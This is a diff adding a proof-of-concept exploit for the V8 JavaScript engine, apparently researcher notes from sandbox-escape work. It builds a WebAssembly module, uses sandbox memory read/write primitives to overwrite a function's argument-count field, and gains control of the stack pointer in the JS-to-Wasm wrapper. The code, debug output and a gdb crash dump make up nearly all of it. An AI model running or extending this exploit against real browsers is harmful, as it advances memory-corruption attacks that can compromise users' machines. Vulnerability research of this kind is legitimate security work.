@@ -1,5 +1,122 @@
 
 
+//r --expose-gc --allow-natives-syntax --sandbox-testing    --experimental-wasm-memory64 poc.js
+d8.file.execute('./test/mjsunit/wasm/wasm-module-builder.js');
+let sandboxMemory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
+
+function addrOf(obj) {
+    return Sandbox.getAddressOf(obj);
+  }
+  
+  function v8_read64(addr) {
+    return sandboxMemory.getBigUint64(Number(addr), true);
+  }
+  
+  function v8_write64(addr, val) {
+    return sandboxMemory.setBigInt64(Number(addr), val, true);
+  }
+
+const builder = new WasmModuleBuilder();
+builder.exportMemoryAs("mem0", 0);
+const GB = 1024 * 1024 * 1024;
+let $mem0 = builder.addMemory64(1 * GB / kPageSize);
+
+let $box = builder.addStruct([makeField(kWasmFuncRef, true)]);
+
+let $sig_i_l = builder.addType(kSig_i_l); //let kSig_i_l = makeSig([kWasmI64], [kWasmI32]);
+builder.addFunction("func0", kSig_v_l).exportFunc().addBody([ // func 0 receive a int32 and write to that address??
+//let kSig_v_i = makeSig([kWasmI32], []);
+  kExprLocalGet, 0,
+  ...wasmI32Const(0x41414141),
+  kExprI32StoreMem, 0, 0, // i32.store offset = -1
+]);
+builder.addFunction("func1", $sig_i_l).exportFunc().addBody([ // function 1 convert from int32 to int64
+  kExprLocalGet, 0,
+  kExprI32ConvertI64,
+]);
+builder.addFunction("get_func0", kSig_r_v).exportFunc().addBody([ //let kSig_r_v = makeSig([], [kWasmExternRef]);
+  kExprRefFunc, 0,
+  kGCPrefix, kExprStructNew, $box,
+  kGCPrefix, kExprExternConvertAny,
+]);
+builder.addFunction("get_func1", kSig_r_v).exportFunc().addBody([
+  kExprRefFunc, 1,
+  kGCPrefix, kExprStructNew, $box,
+  kGCPrefix, kExprExternConvertAny,
+]);
+builder.addFunction("boom", kSig_i_l).exportFunc().addBody([ // boom call function in ref with arg is int64 so it should call func_1 but instead func_0 got called
+  kExprLocalGet, 0,
+  kExprRefFunc, 1,
+  kExprCallRef, $sig_i_l,
+])
+
+let instance = builder.instantiate();
+instance.exports.func0(0n);
+
+instance.exports.func1(0n);
+instance.exports.func0(0n);
+
+%DebugPrint(instance.exports.func1);
+/*
+DebugPrint: 0x2b9a002dcc09: [Function] in OldSpace
+ - map: 0x2b9a00292709 <Map[28](HOLEY_ELEMENTS)> [FastProperties]
+ - prototype: 0x2b9a00281dc9 <JSFunction (sfi = 0x2b9a001474a5)>
+ - elements: 0x2b9a00000725 <FixedArray[0]> [HOLEY_ELEMENTS]
+ - function prototype: <no-prototype-slot>
+ - shared_info: 0x2b9a002dcbd9 <SharedFunctionInfo js-to-wasm:l:i>
+ - name: 0x2b9a00002801 <String[1]: #1>
+ - builtin: JSToWasmWrapper
+ - formal_parameter_count: 1
+ - kind: NormalFunction
+ - context: 0x2b9a00281729 <NativeContext[295]>
+ - code: 0x2b9a002652c5 <Code BUILTIN JSToWasmWrapper>
+ - Wasm instance data: 0x39d4000c60f1 <Other heap object (WASM_TRUSTED_INSTANCE_DATA_TYPE)>
+ - Wasm function index: 1
+ - properties: 0x2b9a00000725 <FixedArray[0]>
+ - All own properties (excluding elements): {
+    0x2b9a00000d99: [String] in ReadOnlySpace: #length: 0x2b9a00271385 <AccessorInfo name= 0x2b9a00000d99 <String[6]: #length>, data= 0x2b9a00000069 <undefined>> (const accessor descriptor, attrs: [__C]), location: descriptor
+    0x2b9a00000dc5: [String] in ReadOnlySpace: #name: 0x2b9a0027136d <AccessorInfo name= 0x2b9a00000dc5 <String[4]: #name>, data= 0x2b9a00000069 <undefined>> (const accessor descriptor, attrs: [__C]), location: descriptor
+    0x2b9a00004205: [String] in ReadOnlySpace: #arguments: 0x2b9a0027133d <AccessorInfo name= 0x2b9a00004205 <String[9]: #arguments>, data= 0x2b9a00000069 <undefined>> (const accessor descriptor, attrs: [___]), location: descriptor
+    0x2b9a00004485: [String] in ReadOnlySpace: #caller: 0x2b9a00271355 <AccessorInfo name= 0x2b9a00004485 <String[6]: #caller>, data= 0x2b9a00000069 <undefined>> (const accessor descriptor, attrs: [___]), location: descriptor
+ }
+ - feedback vector: feedback metadata is not available in SFI
+
+ gdb$ p/x 0x2b9a002dcc09-0x30
+$1 = 0x2b9a002dcbd9 (shared_info: 0x2b9a002dcbd9)
+
+addrOf(instance.exports.func1)-0x30+0x18 -> (target.shared_function_info.length));
+
+
+https://source.chromium.org/chromium/chromium/src/+/main:v8/src/builtins/js-to-wasm.tq;l=732
+  const declaredArgCount =
+      Convert<intptr>(Convert<int32>(target.shared_function_info.length));
+  if (declaredArgCount > popCount) {
+    popCount = declaredArgCount;
+  }
+  // Also pop the receiver.
+  PopAndReturn(popCount + 1, result); -> we can control the stack!!!
+  Crash at:
+  -----------------------------------------------------------------------------------------------------------------------[e[1m][regs]
+  RAX: 0x0000000000000000  RBX: 0x0000324C00000069  RBP: 0x00007FFFFFFFD540  RSP: 0x00007FFFFFFFD4C0  [e[1m][e[0;31m]o d I t S z a P C
+  RDI: 0x0000324C002DD4E5  RSI: 0x000000000000009D  RDX: 0x0000324C000202D5  RCX: 0x0000000000004142  RIP:[e[0;31m] 0x00007FFF7FDA273E
+  R8 : 0x0000000000004141  R9 : 0x0000000000000005  R10: 0x00007FFF7F4C5B89  R11: 0x00007FFFFFFFD3D0  R12: 0x00007FFFF7FB0F00
+  R13: 0x00005555555E3080  R14: 0x0000324C00000000  R15: 0x0000324C00000725
+  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B
+-----------------------------------------------------------------------------------------------------------------------[e[1m][code]
+=> 0x7fff7fda273e:	lea    esp,[rsp+rcx*8]
+   0x7fff7fda2741:	push   r10
+   0x7fff7fda2743:	ret
+ */
+v8_write64(addrOf(instance.exports.func1)-0x30+0x18,0x4141n);
+%SystemBreak();
+instance.exports.func1(0n);
+instance.exports.func0(0n);
+
+instance.exports.get_func1();
+
+
+
+
 Seems the rwx randomly placed at different runs?
 Let find the code reponsible for different memory section in v8.
 
